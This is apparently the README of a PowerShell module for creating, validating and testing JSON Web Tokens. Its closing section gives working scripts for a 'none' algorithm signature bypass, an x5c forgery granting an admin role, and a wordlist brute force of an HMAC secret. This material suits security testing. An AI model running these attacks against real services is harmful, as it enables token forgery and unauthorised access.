# ReadMe

## PSJsonWebToken

This module contains functions to create, validate, and test JSON Web Tokens per [RFC 7519](https://tools.ietf.org/html/rfc7519). Additional functionality is included for the creation of JSON Web Keys per [RFC 7517](https://tools.ietf.org/html/rfc7517).

## Installation and Usage

Installing the module.

```powershell
# Install module
Install-Module -Name PSJsonWebToken -Scope CurrentUser -Repository PSGallery
```

## Examples

### Basic token creation and validation

```powershell
# Decode (not validate) a JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$jwt | ConvertFrom-EncodedJsonWebToken


# Create an HMAC-SHA256 signed JWT with a five minute lifetime
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -SecureKey $secretKey -TimeToLive 300


# Validate an HMAC-SHA256 signed JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey


# Validate an HMAC-SHA256 signed JWT signature only (skip expiration check)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey -SkipExpirationCheck


# Create an RSA-SHA256 signed JWT with a five minute lifetime
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -Certificate $cert -TimeToLive 300


# Validate an RSA-SHA256 signed JWT (signature and expiration check)
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" # (Get-PfxCertificate is capable of also getting certs sans private key)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -Certificate $cert
```

### Generate a JWK (JSON Web Key set) from a certificate
```powershell
# Return as formatted JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" 
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification


# Compress the resulting JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" 
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification -Compress
```

### JWT attacks
```powershell
# None alg attack
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
[System.Collections.Hashtable]$headerHashTable = Get-JsonWebTokenHeader -JsonWebToken $jwt

$headerHashTable.Remove("kid")
$headerHashTable.Remove("x5t")
$headerHashTable.alg = "none"

$newHeader = $headerHashTable | ConvertTo-JwtPart
$unalteredPayload = Get-JsonWebTokenPayload -JsonWebToken $jwt -AsEncodedString

$alteredJwt = "{0}.{1}." -f $newHeader, $unalteredPayload


# x5c claim misuse
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
$x5c = Convert-X509CertificateToBase64 -Certificate $cert -NoFormat
$encodedThumbprint = ConvertTo-Base64UrlEncodedString -Bytes $cert.GetCertHash()
$jwtHeader = @{typ="JWT";alg="RS256";kid=$encodedThumbprint;x5c=$x5c} | ConvertTo-JwtPart
$jwtPayload = @{sub="username@company.com";role="admin"} | ConvertTo-JwtPart
$jwtSansSig = "{0}.{1}" -f $jwtHeader, $jwtPayload
$signature = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -Certificate $cert

$signedJwt = "{0}.{1}" -f $jwtSansSig, $signature


# Brute force an HMAC-SHA256 JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNjQ0NzIsIm5iZiI6MTYwNjA2NDQ3MiwiZXhwIjoxNjA2MDY0NzcyLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.VFKBN8RI0uch0TjtUwrj6MG_StImW3eBdkOqLkTQwfA"

$wordListFilePath = "./rockyou.txt"
$wordList = [System.IO.File]::ReadAllLines($wordListFilePath)

foreach ($secret in $wordList)
{
    if ($secret.Trim().Length -ge 1)
    {
        [bool]$cracked = Test-JsonWebToken -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256    
        if ($cracked)
        {
            $outputMessage = "Secret was: {0}" -f $secret
            Write-Host -Object $outputMessage -ForegroundColor Green
            break
        }
    }
}
```
